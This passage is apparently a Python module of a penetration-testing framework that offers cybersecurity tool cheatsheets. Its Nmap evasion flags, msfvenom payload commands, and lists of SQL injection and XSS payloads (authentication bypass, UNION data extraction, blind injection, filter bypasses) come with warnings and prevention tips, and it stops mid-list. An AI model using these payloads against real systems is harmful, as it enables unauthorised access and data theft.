"""
Command Helper module for Leegion Framework
Comprehensive cheatsheets and command references for cybersecurity tools

Author: Leegion
Project: Leegion Framework v2.0
Copyright (c) 2025 Leegion. All rights reserved.
"""

import json
import os
from typing import Dict, List, Any, Optional
from datetime import datetime
from core.base_module import BaseModule
from core.banner import print_module_header


class CommandHelper(BaseModule):
    """Command helper with comprehensive cybersecurity tool cheatsheets"""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(config, "Command_Helper")
        self.custom_commands = {}
        self.command_history = []
        self.favorites = set()

    def run(self):
        """Main command helper interface"""
        print_module_header(
            "Command Helper", "Cybersecurity Tool Cheatsheets & References"
        )

        while True:
            self._display_helper_menu()
            choice = self.get_user_input("Select option: ")

            if not choice:
                continue

            if choice == "1":
                self._view_tool_cheatsheets()
            elif choice == "2":
                self._search_commands()
            elif choice == "3":
                self._vulnerability_references()
            elif choice == "4":
                self._payload_generators()
            elif choice == "5":
                self._network_references()
            elif choice == "6":
                self._web_application_references()
            elif choice == "7":
                self._custom_command_manager()
            elif choice == "8":
                self._command_favorites()
            elif choice == "9":
                self._quick_reference_cards()
            elif choice == "10":
                self._export_cheatsheets()
            elif choice == "11":
                break
            else:
                self.print_error("Invalid selection. Please try again.")

    def _display_helper_menu(self):
        """Display command helper menu"""
        favorites_count = len(self.favorites)

        print(f"\n\033[93m{'='*65}\033[0m")
        print(f"\033[93m{'COMMAND HELPER MENU'.center(65)}\033[0m")
        print(f"\033[93m{'='*65}\033[0m")
        print(f"\033[96mFavorite Commands:\033[0m {favorites_count}")
        print(
            f"\033[93m🎯 BEGINNER TIP:\033[0m Learn these commands hands-on at \033[92mtryhackme.com\033[0m"
        )
        print(f"\033[93m{'-'*65}\033[0m")
        print("\033[96m 1.\033[0m Tool Cheatsheets")
        print("\033[96m 2.\033[0m Search Commands")
        print("\033[96m 3.\033[0m Vulnerability References")
        print("\033[96m 4.\033[0m Payload Generators")
        print("\033[96m 5.\033[0m Network References")
        print("\033[96m 6.\033[0m Web Application References")
        print("\033[96m 7.\033[0m Custom Command Manager")
        print("\033[96m 8.\033[0m Command Favorites")
        print("\033[96m 9.\033[0m Quick Reference Cards")
        print("\033[96m10.\033[0m Export Cheatsheets")
        print("\033[96m11.\033[0m Back to Main Menu")
        print(f"\033[93m{'='*65}\033[0m")

    def _view_tool_cheatsheets(self):
        """View cheatsheets for various cybersecurity tools"""
        print("\nAvailable tool cheatsheets:")
        tools = [
            "Nmap",
            "Metasploit",
            "Burp Suite",
            "Wireshark",
            "Sqlmap",
            "Nikto",
            "Dirb/Gobuster",
            "Hydra",
            "John the Ripper",
            "Hashcat",
            "Aircrack-ng",
            "Ettercap",
            "tcpdump",
            "OpenSSL",
            "curl/wget",
        ]

        for i, tool in enumerate(tools, 1):
            print(f"\033[96m{i:2d}.\033[0m {tool}")

        choice = self.get_user_input("Select tool (1-15): ")

        tool_methods = {
            "1": self._nmap_cheatsheet,
            "2": self._metasploit_cheatsheet,
            "3": self._burp_cheatsheet,
            "4": self._wireshark_cheatsheet,
            "5": self._sqlmap_cheatsheet,
            "6": self._nikto_cheatsheet,
            "7": self._dirb_gobuster_cheatsheet,
            "8": self._hydra_cheatsheet,
            "9": self._john_cheatsheet,
            "10": self._hashcat_cheatsheet,
            "11": self._aircrack_cheatsheet,
            "12": self._ettercap_cheatsheet,
            "13": self._tcpdump_cheatsheet,
            "14": self._openssl_cheatsheet,
            "15": self._curl_wget_cheatsheet,
        }

        if choice in tool_methods:
            tool_methods[choice]()
        else:
            self.print_error("Invalid tool selection")

    def _search_commands(self):
        """Search for commands by keyword"""
        keyword = self.get_user_input("Enter search keyword: ")
        if not keyword:
            return

        self.print_info(f"Searching for commands containing '{keyword}'...")

        # Search through all cheatsheets
        results = self._search_all_cheatsheets(keyword.lower())

        if results:
            print(f"\n\033[93mFound {len(results)} matching commands:\033[0m")
            for i, result in enumerate(results, 1):
                print(f"\n\033[96m{i}. {result['tool']} - {result['category']}\033[0m")
                print(f"   Command: \033[92m{result['command']}\033[0m")
                print(f"   Description: {result['description']}")

                if i % 5 == 0 and i < len(results):
                    more = self.get_user_input(
                        "Press Enter to continue or 'q' to stop: "
                    )
                    if more.lower() == "q":
                        break
        else:
            self.print_warning(f"No commands found for keyword '{keyword}'")

    def _vulnerability_references(self):
        """Display vulnerability references and exploitation techniques"""
        print("\nVulnerability categories:")
        categories = [
            "OWASP Top 10",
            "SQL Injection",
            "XSS (Cross-Site Scripting)",
            "CSRF",
            "Buffer Overflow",
            "Privilege Escalation",
            "Path Traversal",
            "Command Injection",
            "XXE",
            "Insecure Deserialization",
        ]

        for i, category in enumerate(categories, 1):
            print(f"\033[96m{i:2d}.\033[0m {category}")

        choice = self.get_user_input("Select category (1-10): ")

        vuln_methods = {
            "1": self._owasp_top10_reference,
            "2": self._sql_injection_reference,
            "3": self._xss_reference,
            "4": self._csrf_reference,
            "5": self._buffer_overflow_reference,
            "6": self._privilege_escalation_reference,
            "7": self._path_traversal_reference,
            "8": self._command_injection_reference,
            "9": self._xxe_reference,
            "10": self._insecure_deserialization_reference,
        }

        if choice in vuln_methods:
            vuln_methods[choice]()
        else:
            self.print_error("Invalid category selection")

    def _payload_generators(self):
        """Generate common payloads for testing"""
        print("\nPayload generators:")
        print("\033[96m1.\033[0m SQL Injection Payloads")
        print("\033[96m2.\033[0m XSS Payloads")
        print("\033[96m3.\033[0m Command Injection Payloads")
        print("\033[96m4.\033[0m Path Traversal Payloads")
        print("\033[96m5.\033[0m LDAP Injection Payloads")
        print("\033[96m6.\033[0m XXE Payloads")

        choice = self.get_user_input("Select payload type (1-6): ")

        payload_methods = {
            "1": self._generate_sql_payloads,
            "2": self._generate_xss_payloads,
            "3": self._generate_command_injection_payloads,
            "4": self._generate_path_traversal_payloads,
            "5": self._generate_ldap_payloads,
            "6": self._generate_xxe_payloads,
        }

        if choice in payload_methods:
            payload_methods[choice]()
        else:
            self.print_error("Invalid payload type selection")

    def _network_references(self):
        """Network security references"""
        print("\nNetwork security references:")
        print("\033[96m1.\033[0m Port Numbers Reference")
        print("\033[96m2.\033[0m Network Reconnaissance")
        print("\033[96m3.\033[0m Wireless Security")
        print("\033[96m4.\033[0m Network Protocols")
        print("\033[96m5.\033[0m Firewall Evasion")

        choice = self.get_user_input("Select reference (1-5): ")

        network_methods = {
            "1": self._port_numbers_reference,
            "2": self._network_recon_reference,
            "3": self._wireless_security_reference,
            "4": self._network_protocols_reference,
            "5": self._firewall_evasion_reference,
        }

        if choice in network_methods:
            network_methods[choice]()
        else:
            self.print_error("Invalid reference selection")

    def _web_application_references(self):
        """Web application security references"""
        print("\nWeb application security references:")
        print("\033[96m1.\033[0m HTTP Status Codes")
        print("\033[96m2.\033[0m HTTP Headers")
        print("\033[96m3.\033[0m Web Shells")
        print("\033[96m4.\033[0m Reverse Shells")
        print("\033[96m5.\033[0m Web Fuzzing")

        choice = self.get_user_input("Select reference (1-5): ")

        web_methods = {
            "1": self._http_status_codes_reference,
            "2": self._http_headers_reference,
            "3": self._web_shells_reference,
            "4": self._reverse_shells_reference,
            "5": self._web_fuzzing_reference,
        }

        if choice in web_methods:
            web_methods[choice]()
        else:
            self.print_error("Invalid reference selection")

    def _custom_command_manager(self):
        """Manage custom commands"""
        print("\nCustom command manager:")
        print("\033[96m1.\033[0m Add Custom Command")
        print("\033[96m2.\033[0m View Custom Commands")
        print("\033[96m3.\033[0m Edit Custom Command")
        print("\033[96m4.\033[0m Delete Custom Command")

        choice = self.get_user_input("Select option (1-4): ")

        if choice == "1":
            self._add_custom_command()
        elif choice == "2":
            self._view_custom_commands()
        elif choice == "3":
            self._edit_custom_command()
        elif choice == "4":
            self._delete_custom_command()
        else:
            self.print_error("Invalid option")

    def _command_favorites(self):
        """Manage favorite commands"""
        if not self.favorites:
            self.print_warning("No favorite commands saved")
            return

        print(f"\n\033[93m{'FAVORITE COMMANDS'.center(60)}\033[0m")
        print(f"\033[93m{'-'*60}\033[0m")

        for i, favorite in enumerate(sorted(self.favorites), 1):
            print(f"\033[96m{i:2d}.\033[0m {favorite}")

        print("\nOptions:")
        print("1. Remove favorite")
        print("2. Clear all favorites")

        choice = self.get_user_input("Select option (1-2) or press Enter to continue: ")

        if choice == "1":
            fav_num = self.get_user_input("Enter favorite number to remove: ")
            if fav_num and fav_num.isdigit():
                fav_list = sorted(self.favorites)
                idx = int(fav_num) - 1
                if 0 <= idx < len(fav_list):
                    self.favorites.remove(fav_list[idx])
                    self.print_success("Favorite removed")
        elif choice == "2":
            confirm = self.get_user_input("Clear all favorites? (y/N): ")
            if confirm.lower() == "y":
                self.favorites.clear()
                self.print_success("All favorites cleared")

    def _quick_reference_cards(self):
        """Display quick reference cards"""
        print("\nQuick reference cards:")
        print("\033[96m1.\033[0m Linux Commands")
        print("\033[96m2.\033[0m Windows Commands")
        print("\033[96m3.\033[0m PowerShell Commands")
        print("\033[96m4.\033[0m Bash Scripting")
        print("\033[96m5.\033[0m Regular Expressions")

        choice = self.get_user_input("Select reference card (1-5): ")

        card_methods = {
            "1": self._linux_commands_card,
            "2": self._windows_commands_card,
            "3": self._powershell_commands_card,
            "4": self._bash_scripting_card,
            "5": self._regex_reference_card,
        }

        if choice in card_methods:
            card_methods[choice]()
        else:
            self.print_error("Invalid reference card selection")

    def _export_cheatsheets(self):
        """Export cheatsheets to files"""
        print("\nExport options:")
        print("1. Export all cheatsheets to JSON")
        print("2. Export custom commands")
        print("3. Export favorites")
        print("4. Create PDF cheatsheet")

        choice = self.get_user_input("Select export option (1-4): ")

        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_dir = self.config.get("output_dir", "./reports/output")

            if choice == "1":
                self._export_all_cheatsheets_json(output_dir, timestamp)
            elif choice == "2":
                self._export_custom_commands(output_dir, timestamp)
            elif choice == "3":
                self._export_favorites(output_dir, timestamp)
            elif choice == "4":
                self._create_pdf_cheatsheet(output_dir, timestamp)
            else:
                self.print_error("Invalid export option")

        except Exception as e:
            self.print_error(f"Export failed: {e}")

    # Tool-specific cheatsheet methods
    def _nmap_cheatsheet(self):
        """Enhanced Nmap cheatsheet with educational descriptions"""
        print(f"\n\033[93m{'NMAP CHEATSHEET & EDUCATIONAL GUIDE'.center(80)}\033[0m")
        print(f"\033[93m{'='*80}\033[0m")

        print(f"\n\033[96m📚 WHAT IS NMAP?\033[0m")
        print(
            "Nmap (Network Mapper) is a powerful network discovery and security auditing tool."
        )
        print(
            "It's used to discover hosts, services, and gather information about network targets."
        )

        enhanced_commands = {
            "🎯 Basic Scans (Perfect for Beginners)": [
                (
                    "nmap 192.168.1.1",
                    "Basic port scan - scans top 1000 most common ports\n"
                    + "   Best for: Initial reconnaissance of a single target\n"
                    + "   Speed: Fast | Stealth: Medium | Info: Basic port states\n"
                    + "   Example: nmap google.com (finds web servers, mail servers)\n"
                    + "   Real scenario: CTF box discovery, network asset inventory",
                ),
                (
                    "nmap -sn 192.168.1.0/24",
                    "Ping scan (host discovery) - finds live hosts without port scanning\n"
                    + "   Best for: Discovering which hosts are online in a network\n"
                    + "   Example: nmap -sn 192.168.1.0/24 → finds 192.168.1.1, 192.168.1.100, etc.\n"
                    + "   Real scenario: Home network audit, office network mapping",
                ),
                (
                    "nmap -sS 192.168.1.1",
                    "SYN stealth scan - sends SYN packets without completing handshake\n"
                    + "   Best for: Stealthy reconnaissance, avoiding logs\n"
                    + "   How it works: Sends TCP SYN → receives SYN-ACK → sends RST\n"
                    + "   Example: nmap -sS target.com (quieter than full connection)\n"
                    + "   Real scenario: Penetration testing, avoiding IDS detection",
                ),
                (
                    "nmap -sT 192.168.1.1",
                    "TCP connect scan - completes full TCP handshake\n"
                    + "   Best for: When you don't have administrator/root privileges\n"
                    + "   Trade-off: More reliable but easier to detect and log\n"
                    + "   Example: nmap -sT hackthebox.eu (works without sudo)\n"
                    + "   Real scenario: Scanning from shared hosting, limited user accounts",
                ),
            ],
            "🎯 Smart Port Selection": [
                (
                    "nmap -p 22,80,443 192.168.1.1",
                    "Scan critical ports: SSH (22), HTTP (80), HTTPS (443)\n"
                    + "   Best for: Quick check of essential services\n"
                    + "   Use case: Web servers, remote access verification",
                ),
                (
                    "nmap -p 1-1000 192.168.1.1",
                    "Scan first 1000 ports (covers most common services)\n"
                    + "   Best for: Comprehensive but not exhaustive scanning\n"
                    + "   Speed: Medium | Coverage: High for standard services",
                ),
                (
                    "nmap --top-ports 100 192.168.1.1",
                    "Scan the 100 most commonly used ports\n"
                    + "   Best for: Quick reconnaissance with excellent coverage\n"
                    + "   Efficiency: Finds 90% of services in minimal time",
                ),
                (
                    "nmap -p- 192.168.1.1",
                    "Scan ALL 65535 ports (comprehensive but slow)\n"
                    + "   Best for: CTF challenges, complete discovery\n"
                    + "   ⚠️ WARNING: Very slow (hours), may trigger security alerts",
                ),
            ],
            "🔍 Information Gathering": [
                (
                    "nmap -sV 192.168.1.1",
                    "Service version detection - identifies software versions\n"
                    + "   Discovers: Apache 2.4.41, OpenSSH 7.4, MySQL 5.7.3\n"
                    + "   Best for: Vulnerability research, understanding target environment",
                ),
                (
                    "nmap -O 192.168.1.1",
                    "Operating system detection - identifies target OS\n"
                    + "   Discovers: Windows 10, Ubuntu 20.04, CentOS 7\n"
                    + "   How: Analyzes TCP/IP stack behavior patterns",
                ),
                (
                    "nmap -A 192.168.1.1",
                    "Aggressive scan: OS + version detection + default scripts\n"
                    + "   Best for: Maximum information in one command\n"
                    + "   ⚠️ WARNING: Very noisy, easily detected by security systems",
                ),
                (
                    "nmap --script vuln 192.168.1.1",
                    "Vulnerability detection scripts - finds known security issues\n"
                    + "   Discovers: CVE numbers, misconfigurations, weak settings\n"
                    + "   ⚠️ Use carefully: May trigger alerts or crash services",
                ),
            ],
            "⚡ Speed vs Stealth Balance": [
                (
                    "nmap -T1 192.168.1.1",
                    "Sneaky timing - very slow but hard to detect\n"
                    + "   Best for: Avoiding IDS/IPS detection\n"
                    + "   Speed: Very slow (hours) | Detection risk: Minimal",
                ),
                (
                    "nmap -T3 192.168.1.1",
                    "Normal timing - default balanced approach\n"
                    + "   Best for: Most situations, good speed/stealth compromise\n"
                    + "   Speed: Medium | Detection risk: Low-Medium",
                ),
                (
                    "nmap -T4 192.168.1.1",
                    "Aggressive timing - faster but more detectable\n"
                    + "   Best for: Internal networks, time-sensitive scanning\n"
                    + "   Speed: Fast | Detection risk: Medium-High",
                ),
                (
                    "nmap -f 192.168.1.1",
                    "Fragment packets to evade simple firewalls\n"
                    + "   Best for: Bypassing basic packet filtering\n"
                    + "   How: Splits scan packets into smaller fragments",
                ),
            ],
            "💾 Saving Your Results": [
                (
                    "nmap -oN scan_results.txt 192.168.1.1",
                    "Save human-readable output to text file\n"
                    + "   Best for: Reading results later, including in reports\n"
                    + "   Format: Same as what you see on screen",
                ),
                (
                    "nmap -oX scan_results.xml 192.168.1.1",
                    "Save XML output for automated processing\n"
                    + "   Best for: Importing into other security tools\n"
                    + "   Compatible with: Metasploit, Nessus, custom scripts",
                ),
                (
                    "nmap -oA complete_scan 192.168.1.1",
                    "Save in ALL formats (.nmap, .xml, .gnmap)\n"
                    + "   Best for: Comprehensive documentation\n"
                    + "   Creates: 3 files with different formats for various uses",
                ),
            ],
        }

        for category, command_list in enhanced_commands.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, (command, description) in enumerate(command_list, 1):
                print(f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m")
                print(f"\033[93m   {description}\033[0m")

        print(f"\n\033[96m🎓 BEGINNER'S SCANNING STRATEGY:\033[0m")
        print("1. START: nmap -T3 192.168.1.1 (basic scan)")
        print("2. DISCOVER: nmap -sV -p <found_ports> 192.168.1.1 (version detection)")
        print("3. WEB CHECK: nmap --script http-enum -p 80,443 192.168.1.1")
        print("4. VULNERABILITY: nmap --script vuln -p <ports> 192.168.1.1")
        print("5. DOCUMENT: nmap -oA final_scan 192.168.1.1")

        print(f"\n\033[91m⚠️  CRITICAL LEGAL WARNINGS:\033[0m")
        print("• Only scan networks you own or have explicit written permission")
        print("• Port scanning without permission is illegal in many jurisdictions")
        print("• Aggressive scans can crash services and cause downtime")
        print("• Always get authorization before testing production systems")

        print(f"\n\033[96m💡 PRACTICAL EXAMPLES:\033[0m")
        print("• Home network discovery: nmap -sn 192.168.1.0/24")
        print("• Quick web server check: nmap -p 80,443 example.com")
        print("• Comprehensive host scan: nmap -A -T3 192.168.1.100")
        print("• Stealth scan: nmap -sS -T1 -f target.com")

    def _metasploit_cheatsheet(self):
        """Metasploit command cheatsheet"""
        commands = {
            "Basic Commands": [
                ("msfconsole", "Start Metasploit console"),
                ("help", "Show help"),
                ("search <term>", "Search for modules"),
                ("use <module>", "Use a module"),
                ("info", "Show module information"),
                ("back", "Return to main menu"),
            ],
            "Module Management": [
                ("show exploits", "List available exploits"),
                ("show payloads", "List available payloads"),
                ("show auxiliaries", "List auxiliary modules"),
                ("show encoders", "List encoders"),
                ("show nops", "List NOP generators"),
            ],
            "Options & Execution": [
                ("show options", "Show module options"),
                ("set <option> <value>", "Set option value"),
                ("setg <option> <value>", "Set global option"),
                ("unset <option>", "Unset option"),
                ("run", "Execute module"),
                ("exploit", "Execute exploit"),
            ],
            "Payloads": [
                ("set payload <payload>", "Set payload"),
                ("show payloads", "Show compatible payloads"),
                ("generate -f exe -o payload.exe", "Generate standalone payload"),
                (
                    "msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe > payload.exe",
                    "Generate with msfvenom",
                ),
            ],
            "Sessions": [
                ("sessions -l", "List active sessions"),
                ("sessions -i <id>", "Interact with session"),
                ("sessions -k <id>", "Kill session"),
                ("background", "Background current session"),
            ],
        }

        self._display_cheatsheet("Metasploit", commands)

    def _burp_cheatsheet(self):
        """Burp Suite shortcuts and tips"""
        commands = {
            "Shortcuts": [
                ("Ctrl+Shift+B", "Send to Burp"),
                ("Ctrl+R", "Send to Repeater"),
                ("Ctrl+I", "Send to Intruder"),
                ("Ctrl+Shift+C", "Send to Comparer"),
                ("Ctrl+U", "URL decode"),
                ("Ctrl+Shift+U", "URL encode"),
            ],
            "Proxy": [
                ("Intercept On/Off", "Toggle request interception"),
                ("Forward", "Forward intercepted request"),
                ("Drop", "Drop intercepted request"),
                ("Action > Do active scan", "Start active scan"),
                ("Action > Spider this host", "Start spider"),
            ],
            "Repeater": [
                ("Go", "Send request"),
                ("Ctrl+Space", "Auto-complete"),
                ("Ctrl+U", "URL decode selection"),
                ("Ctrl+Shift+U", "URL encode selection"),
                ("Ctrl+H", "Base64 decode"),
            ],
            "Intruder": [
                ("Add §", "Add payload position"),
                ("Clear §", "Clear payload positions"),
                ("Sniper", "Single payload set"),
                ("Battering ram", "Single payload to all positions"),
                ("Pitchfork", "Multiple payload sets (parallel)"),
                ("Cluster bomb", "Multiple payload sets (cartesian)"),
            ],
        }

        self._display_cheatsheet("Burp Suite", commands)

    def _sqlmap_cheatsheet(self):
        """SQLMap command cheatsheet"""
        commands = {
            "Basic Usage": [
                ("sqlmap -u '<url>'", "Basic SQL injection test"),
                ("sqlmap -u '<url>' --dbs", "Enumerate databases"),
                ("sqlmap -u '<url>' -D <db> --tables", "Enumerate tables"),
                ("sqlmap -u '<url>' -D <db> -T <table> --columns", "Enumerate columns"),
                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump", "Dump data"),
            ],
            "Request Options": [
                ("--cookie='JSESSIONID=...'", "Use cookies"),
                ("--user-agent='...'", "Custom user agent"),
                ("--referer='...'", "Custom referer"),
                ("--headers='X-Forwarded-For: 127.0.0.1'", "Custom headers"),
                ("--method=POST", "Use POST method"),
                ("--data='param=value'", "POST data"),
            ],
            "Detection Options": [
                ("--level=5", "Test level (1-5)"),
                ("--risk=3", "Risk level (1-3)"),
                ("--technique=BEUST", "SQL injection techniques"),
                ("--dbms=mysql", "Force DBMS type"),
                ("--os=linux", "Force OS type"),
            ],
            "Advanced Features": [
                ("--batch", "Non-interactive mode"),
                ("--random-agent", "Use random user agent"),
                ("--proxy=http://127.0.0.1:8080", "Use proxy"),
                ("--tor", "Use Tor network"),
                ("--check-tor", "Check Tor connection"),
                ("--flush-session", "Flush session files"),
            ],
        }

        self._display_cheatsheet("SQLMap", commands)

    def _generate_sql_payloads(self):
        """Generate SQL injection payloads with educational descriptions"""
        print(
            f"\n\033[93m{'SQL INJECTION PAYLOADS & EDUCATIONAL GUIDE'.center(80)}\033[0m"
        )
        print(f"\033[93m{'='*80}\033[0m")

        print(f"\n\033[96m📚 WHAT IS SQL INJECTION?\033[0m")
        print(
            "SQL injection occurs when user input is not properly sanitized before being"
        )
        print(
            "used in SQL queries, allowing attackers to manipulate database operations."
        )

        payloads_with_descriptions = {
            "🎯 Basic Authentication Bypass": [
                (
                    "' OR '1'='1",
                    "Classic bypass - makes condition always true\n"
                    + "   Use: Login forms, search boxes\n"
                    + "   How: Breaks out of quotes and adds always-true condition\n"
                    + "   Example: Username: admin' OR '1'='1 | Password: anything\n"
                    + "   Real scenario: Admin panels, customer portals, database interfaces",
                ),
                (
                    "' OR 1=1--",
                    "Same as above but uses SQL comment (--) to ignore rest\n"
                    + "   Use: When there's additional SQL code after injection point\n"
                    + "   How: Comments out password check or other conditions\n"
                    + "   Example: Login query becomes: WHERE user='admin' OR 1=1-- AND pass='...\n"
                    + "   Real scenario: Legacy applications, custom authentication systems",
                ),
                (
                    "admin'--",
                    "Assumes username 'admin' exists, ignores password\n"
                    + "   Use: When you know a valid username\n"
                    + "   How: Closes username quote and comments out password check\n"
                    + "   Example: Username: admin'-- | Password: (ignored)\n"
                    + "   Real scenario: WordPress admin, CMS backends, database tools",
                ),
                (
                    "') OR '1'='1",
                    "For queries using parentheses around conditions\n"
                    + "   Use: When original query has complex WHERE clauses\n"
                    + "   How: Closes parentheses before adding bypass condition\n"
                    + "   Example: WHERE (username='user' AND active=1) becomes (username='user') OR '1'='1\n"
                    + "   Real scenario: Enterprise applications, multi-condition authentication",
                ),
            ],
            "🔍 Union-Based SQL Injection (Data Extraction)": [
                (
                    "' UNION SELECT 1,2,3--",
                    "Determines number of columns in original query\n"
                    + "   Use: First step in UNION attacks\n"
                    + "   How: Tests if 3 columns exist; adjust numbers until no error\n"
                    + "   Example: Search box → product' UNION SELECT 1,2,3-- \n"
                    + "   Real scenario: E-commerce product search, news article lookup",
                ),
                (
                    "' UNION SELECT user(),database(),version()--",
                    "Extracts database username, name, and version\n"
                    + "   Use: Gathering system information\n"
                    + "   How: Uses MySQL functions to get server details\n"
                    + "   Example: Returns → root@localhost, shop_db, MySQL 5.7.3\n"
                    + "   Real scenario: Fingerprinting database for targeted attacks",
                ),
                (
                    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
                    "Lists all table names in the database\n"
                    + "   Use: Finding interesting tables to target\n"
                    + "   How: Queries information_schema (MySQL's metadata tables)\n"
                    + "   Example: Returns → users,orders,products,admin_logs,payment_info\n"
                    + "   Real scenario: Finding sensitive data tables like credit cards",
                ),
                (
                    "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
                    "Lists column names in 'users' table\n"
                    + "   Use: Finding username/password column names\n"
                    + "   How: Targets specific table to understand its structure\n"
                    + "   Example: Returns → id,username,email,password_hash,is_admin\n"
                    + "   Real scenario: Preparing to extract user credentials",
                ),
            ],
            "⏱️ Time-Based Blind SQL Injection": [
                (
                    "' OR SLEEP(5)--",
                    "MySQL: Causes 5-second delay if injection works\n"
                    + "   Use: When you can't see query results directly\n"
                    + "   How: If page loads 5 seconds slower, injection succeeded\n"
                    + "   Example: Login form → username: admin' OR SLEEP(5)-- \n"
                    + "   Real scenario: Testing if vulnerable when error messages hidden",
                ),
                (
                    "'; WAITFOR DELAY '00:00:05'--",
                    "SQL Server: Same as SLEEP but for Microsoft SQL Server\n"
                    + "   Use: When targeting Windows/MSSQL environments\n"
                    + "   How: Waits 5 seconds before continuing execution\n"
                    + "   Example: Search → query'; WAITFOR DELAY '00:00:05'-- \n"
                    + "   Real scenario: Corporate intranets running Windows Server",
                ),
                (
                    "'; SELECT pg_sleep(5)--",
                    "PostgreSQL: Delay function for PostgreSQL databases\n"
                    + "   Use: When targeting PostgreSQL servers\n"
                    + "   How: PostgreSQL-specific sleep function\n"
                    + "   Example: ID parameter → ?id=1'; SELECT pg_sleep(5)-- \n"
                    + "   Real scenario: Modern web apps using PostgreSQL",
                ),
                (
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "Advanced MySQL delay using subquery\n"
                    + "   Use: When simple SLEEP() is filtered\n"
                    + "   How: Bypasses some WAF filters by using subquery structure\n"
                    + "   Example: Bypasses ModSecurity rules blocking SLEEP()\n"
                    + "   Real scenario: Applications with Web Application Firewalls",
                ),
            ],
            "✅ Boolean-Based Blind SQL Injection": [
                (
                    "' AND 1=1--",
                    "Always true condition - should return normal results\n"
                    + "   Use: Testing if blind injection works\n"
                    + "   How: If page looks normal, injection point exists",
                ),
                (
                    "' AND 1=2--",
                    "Always false condition - should return no/different results\n"
                    + "   Use: Confirming blind injection by comparing with 1=1\n"
                    + "   How: If page differs from 1=1 test, you have blind injection",
                ),
                (
                    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "Tests if database version starts with '5' (MySQL 5.x)\n"
                    + "   Use: Fingerprinting database version\n"
                    + "   How: Change number to identify exact version",
                ),
                (
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "Tests if information_schema exists (confirms MySQL/PostgreSQL)\n"
                    + "   Use: Database fingerprinting\n"
                    + "   How: Only MySQL and PostgreSQL have information_schema",
                ),
            ],
        }

        for category, payload_list in payloads_with_descriptions.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, (payload, description) in enumerate(payload_list, 1):
                print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
                print(f"\033[93m   Description:\033[0m {description}")

        print(f"\n\033[91m⚠️  IMPORTANT SAFETY NOTES:\033[0m")
        print("• Only test on systems you own or have explicit permission to test")
        print("• SQL injection can cause data loss - always backup before testing")
        print("• Start with safe payloads (1=1) before attempting data extraction")
        print(
            "• Use these payloads in CTF environments and authorized penetration tests"
        )

        print(f"\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
        print("• Use parameterized queries/prepared statements")
        print("• Validate and sanitize all user input")
        print("• Use least-privilege database accounts")
        print("• Implement proper error handling (don't show SQL errors to users)")

    def _generate_xss_payloads(self):
        """Generate XSS payloads with educational descriptions"""
        print(
            f"\n\033[93m{'CROSS-SITE SCRIPTING (XSS) PAYLOADS & EDUCATIONAL GUIDE'.center(80)}\033[0m"
        )
        print(f"\033[93m{'='*80}\033[0m")

        print(f"\n\033[96m📚 WHAT IS XSS (CROSS-SITE SCRIPTING)?\033[0m")
        print(
            "XSS allows attackers to inject malicious scripts into web pages viewed by"
        )
        print(
            "other users. The scripts execute in victims' browsers with site privileges."
        )

        payloads_with_descriptions = {
            "🎯 Basic XSS Payloads (Start Here)": [
                (
                    "<script>alert('XSS')</script>",
                    "Classic JavaScript execution test\n"
                    + "   Use: Testing if XSS is possible at all\n"
                    + "   How: Injects JavaScript that shows alert popup\n"
                    + "   Example: Search box input → <script>alert('XSS')</script>\n"
                    + "   Real scenario: Blog comment section, feedback forms",
                ),
                (
                    "<img src=x onerror=alert('XSS')>",
                    "Uses broken image to trigger JavaScript\n"
                    + "   Use: When script tags are filtered\n"
                    + "   How: Browser tries to load image 'x', fails, runs onerror code\n"
                    + "   Example: Profile picture upload → filename: <img src=x onerror=alert('XSS')>\n"
                    + "   Real scenario: File upload forms, avatar settings, image galleries",
                ),
                (
                    "<svg onload=alert('XSS')>",
                    "Uses SVG element with onload event\n"
                    + "   Use: Modern alternative when img tags are blocked\n"
                    + "   How: SVG loads immediately and triggers onload event\n"
                    + "   Example: Rich text editor → <svg onload=alert('XSS')>\n"
                    + "   Real scenario: Forums, blog posts, HTML email templates",
                ),
                (
                    "javascript:alert('XSS')",
                    "JavaScript URL scheme execution\n"
                    + "   Use: In href attributes, form actions, or URL bars\n"
                    + "   How: Browser interprets javascript: URLs as code to execute\n"
                    + "   Example: Contact form → Website field: javascript:alert('XSS')\n"
                    + "   Real scenario: Social media profiles, business listings",
                ),
            ],
            "🔄 Filter Bypass Techniques": [
                (
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "Case variation to bypass simple filters\n"
                    + "   Use: When filters only check lowercase 'script'\n"
                    + "   How: HTML is case-insensitive, so mixed case still works\n"
                    + "   Example: Comment form blocks <script> but allows <ScRiPt>\n"
                    + "   Real scenario: Poorly configured CMS filters, legacy systems",
                ),
                (
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "Character encoding to hide 'XSS' string\n"
                    + "   Use: When keyword filters look for 'XSS' or 'alert'\n"
                    + "   How: Converts ASCII codes (88,83,83) back to 'XSS'\n"
                    + "   Example: Forum post filtered for 'XSS' keyword\n"
                    + "   Real scenario: Content management systems with keyword blocking",
                ),
                (
                    "<svg/onload=alert('XSS')>",
                    "Uses forward slash to bypass space-based filters\n"
                    + "   Use: When spaces between tag name and attributes are filtered\n"
                    + "   How: HTML allows / before attributes instead of spaces\n"
                    + "   Example: Regex /svg \\w+/ doesn't match svg/onload\n"
                    + "   Real scenario: Custom input validation with regex patterns",
                ),
                (
                    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
                    "Base64 encoding to hide malicious code\n"
                    + "   Use: Advanced filter bypass\n"
                    + "   How: Base64 encodes alert('XSS'); then decodes and runs it\n"
                    + "   Example: WAF scans for alert() but misses encoded version\n"
